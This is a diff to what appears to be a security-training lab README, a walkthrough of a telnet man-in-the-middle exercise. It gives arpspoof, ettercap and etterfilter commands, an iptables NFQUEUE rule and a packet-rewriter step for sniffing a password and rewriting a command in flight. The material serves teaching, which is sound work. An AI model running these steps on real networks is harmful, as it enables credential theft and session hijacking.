@@ -18,7 +18,7 @@ A single `192.168.25.0/24` segment behind one router with a `10.10.10.0/24` WAN.
 `provisioning/playbook.yml` runs three plays:
 - **vm1**: installs `inetutils-telnetd` + `inetutils-inetd` + `iptables-persistent`, creates the telnet user (password from APG, `/bin/bash` shell so PAM accepts the login), drops the bait file and the flag file, enables telnetd in inetd, applies the iptables ruleset (only `192.168.25.20` may reach tcp/23).
 - **vm2**: installs `expect` + `telnet`, deploys an expect script that logs in to vm1 and runs `cat /home/<telnet_user>/bait.txt`, behind a systemd timer firing every 30 s.
-- **vma**: fixes the `/etc/hosts` hostname entry (sudo complains otherwise on Kali), installs `ettercap-text-only`, `dsniff`, and `telnet`, provisions the trainee user `user` / `Password123` via the `user-access` role.
+- **vma**: fixes the `/etc/hosts` hostname entry (sudo complains otherwise on Kali), installs `dsniff` (for arpspoof), `telnet`, `python3-scapy`, and `python3-netfilterqueue`, drops a pre-built rewriter script at `/usr/local/sbin/mitm-rewrite.py`, and provisions the trainee user `user` / `Password123` via `user-access`.
 
 APG variables in `variables.yml`:
 - `telnet_user` (type=username) — the local user on vm1 that vm2 logs in as
@@ -32,23 +32,17 @@ APG variables in `variables.yml`:
 3. Enable IP forwarding, bidirectional `arpspoof` to get on the wire (same recipe as N3b).
 4. Open Wireshark on `eth1`, filter `tcp.port == 23`, Follow → TCP Stream, read the password off vm2's next session.
 5. Submit the password (level 2).
-6. Write a tiny `etterfilter` script:
-   ```
-   if (ip.proto == TCP && tcp.dst == 23) {
-       if (search(DATA.data, "bait.txt")) {
-           replace("bait.txt", "flag.txt");
-           msg("modified\n");
-       }
-   }
-   ```
-7. Compile: `etterfilter modify.ef -o modify.ecf`
-8. Run ettercap with the filter and built-in ARP MITM: `sudo ettercap -T -q -i eth1 -F modify.ecf -M arp:remote /192.168.25.10// /192.168.25.20//`
-9. Wait ≤30 s. When `modified` prints, vm1 runs the rewritten `cat flag.txt` under vm2's session. The response flows back; the flag is visible in ettercap's terminal or in a parallel `tcpdump -A 'tcp port 23 and src 192.168.25.10'`.
+6. Send tcp/23 forward traffic to NFQUEUE: `sudo iptables -I FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1`
+7. Run the pre-deployed rewriter: `sudo python3 /usr/local/sbin/mitm-rewrite.py`
+8. Watch vm1's responses in parallel: `sudo tcpdump -ni eth1 -A 'tcp port 23 and src host 192.168.25.10'`
+9. Wait ≤30 s. When the rewriter logs `[+] rewrote bait.txt -> flag.txt`, vm1 has just run the rewritten `cat /home/<user>/flag.txt` under vm2's session. The flag appears in vm1's response payload visible in tcpdump.
 10. Submit the flag (level 3).
 
 ## Tools used
 
-`arpspoof` (from `dsniff`), `tcpdump`, `wireshark`, `ettercap-text-only`, `etterfilter`, optionally `bettercap` (note: bettercap's `arp.spoof` is built for victim ↔ gateway, not victim ↔ victim — use `arpspoof` or ettercap's built-in `-M arp:remote` for this scenario).
+`arpspoof` (from `dsniff`) for the bidirectional ARP MITM, `tcpdump` and `wireshark` for capture, `iptables -j NFQUEUE` to route TCP/23 forward traffic to userland, `python3-scapy` + `python3-netfilterqueue` for the in-flight payload rewrite via `/usr/local/sbin/mitm-rewrite.py`.
+
+Why not ettercap or bettercap: bettercap's `arp.spoof` is built for victim ↔ gateway, not victim ↔ victim. Ettercap's filter mechanism works in theory but its `arp:remote` MITM has reliability issues in current versions — the spoofing is announced as active but data forwarding intermittently breaks. NFQUEUE + a Python script gives you a deterministic packet-modifier on top of arpspoof's proven MITM.
 
 ## MITRE mapping
 
